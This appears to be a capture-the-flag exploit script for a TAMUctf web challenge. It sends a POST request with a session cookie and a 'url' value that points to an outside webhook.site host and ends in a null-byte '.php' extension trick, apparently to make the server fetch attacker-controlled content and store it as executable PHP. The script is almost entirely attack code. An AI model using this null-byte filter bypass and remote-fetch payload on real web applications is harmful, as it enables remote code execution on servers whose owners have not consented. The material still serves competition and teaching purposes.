from pathlib import Path
from requests import post


with post(
    "https://remote.tamuctf.com/index.php",
    cookies={
        "PHPSESSID": "076e1af51b5e3fbc74f525b3baa5f459",
    },
    data={
        "url": "https://webhook.site/c9e085f3-c916-4915-bf7c-dfb7c811245e/?.p\x00hp",
    },
) as req:
    print(req.url)
    # Path("hack.htm").write_text(req.text)
